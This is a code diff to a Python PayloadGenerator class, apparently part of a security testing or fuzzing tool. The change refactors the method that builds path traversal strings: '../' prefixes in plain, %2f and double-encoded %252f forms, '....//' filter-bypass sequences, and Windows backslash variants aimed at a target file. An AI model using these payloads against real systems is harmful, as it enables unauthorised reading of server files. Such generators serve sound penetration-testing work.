@@ -228,14 +228,17 @@ class PayloadGenerator:
         """Path traversal payloads"""
         payloads = []
         
+        win_target = target_file.replace('/', '\\')
         for depth in range(1, 10):
             prefix = "../" * depth
+            pct2f   = prefix.replace('/', '%2f')
+            pct252f = prefix.replace('/', '%252f')
             payloads.extend([
                 f"{prefix}{target_file}",
-                f"{prefix.replace('/', '%2f')}{target_file}",
-                f"{prefix.replace('/', '%252f')}{target_file}",  # double encoding
+                f"{pct2f}{target_file}",
+                f"{pct252f}{target_file}",  # double encoding
                 f"....//....//....//....//....//....//....//....//....//....{target_file}",
-                f"..\\..\\..\\..\\..\\..\\..\\..\\{target_file.replace('/', '\\\\')}",
+                f"..\\..\\..\\..\\..\\..\\..\\..\\{win_target}",
             ])
         
         # Windows specific
